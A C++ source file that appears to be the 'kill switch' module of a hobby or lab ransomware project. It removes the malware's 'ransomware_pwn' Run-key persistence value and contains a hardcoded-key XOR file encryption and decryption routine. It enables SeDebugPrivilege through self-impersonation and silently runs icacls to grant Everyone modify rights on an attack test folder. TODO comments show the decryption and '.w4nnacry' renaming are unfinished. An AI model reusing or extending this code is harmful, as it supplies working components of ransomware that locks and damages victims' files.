#include "kill_switch.h"

vector<wstring> decrypt_files(wstring path)
{
	vector<wstring> subdirs, matches;

	// kill persistence value
	HKEY hKey;
	LONG oresult = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_ALL_ACCESS, &hKey);
	if (oresult == ERROR_SUCCESS)
	{
		RegDeleteValue(hKey, "ransomware_pwn");
		RegCloseKey(hKey);
	}
	else {
		std::cout << "RegDelete Error: " << GetLastError() << std::endl;
	}

	GetPrivsnDelete();

	// TODO: finish the decrypting of files
	// TODO: Replace file extensions to a signature .txt->.w4nnacry
	// TODO: Delete persistance file created
	return matches;
}

// XOR encryptor, decryptor
string encryptDecrypt(string toEncrypt)
{
	char key[10] = { 'A', '2', 'G', '6', 'J', 'L', 'C', 'C', 'Q', 'P' };
	string output = toEncrypt;
	int k_size = (sizeof(key) / sizeof(char));

	for (int i = 0; i < toEncrypt.size(); i++)
	{
		output[i] = toEncrypt[i] ^ key[i % k_size];
	}

	return output;
}

BOOL SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp = { 0 };
	// init all to zero
	LUID luid;
	DWORD cb = sizeof(TOKEN_PRIVILEGES);

	if (!LookupPrivilegeValue(NULL, Privilege, &luid))
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;

	if (bEnablePrivilege)
	{
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	else {
		tp.Privileges[0].Attributes = 0;
	}

	AdjustTokenPrivileges(hToken, FALSE, &tp, cb, NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		return FALSE;
	}

	return TRUE;
}

// This will try to run as admin if local user hasn't been configed properly
void GetPrivsnDelete()
{
	// now set privs back to ransomware, so we can delete and edit our own files
	HANDLE hToken;

	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
	{
		if (GetLastError() == ERROR_NO_TOKEN)
		{
			if (!ImpersonateSelf(SecurityImpersonation))
			{
				std::cout << "Impersonate Error: " << GetLastError() << std::endl;
			}

			if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
			{
				std::cout << "OpenThread Error: " << GetLastError() << std::endl;
			}
		}
		else {
			std::cout << "OpenThreadToken Error: " << GetLastError() << std::endl;
		}
	}

	if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE))
	{
		std::cout << "SetPriv Error: " << GetLastError() << std::endl;

		CloseHandle(hToken);
	}
	else {
		// grant privs back to whole folders
		ShellExecute(NULL,
			NULL,
			"cmd",
			"/k icacls ..\\..\\test_attack_folder\\* /grant \"everyone\":(IO)(CI)M",
			0,
			SW_NORMAL
		);
	}

	// disable SeDebugPriv
	SetPrivilege(hToken, SE_DEBUG_NAME, FALSE);

	CloseHandle(hToken);
}
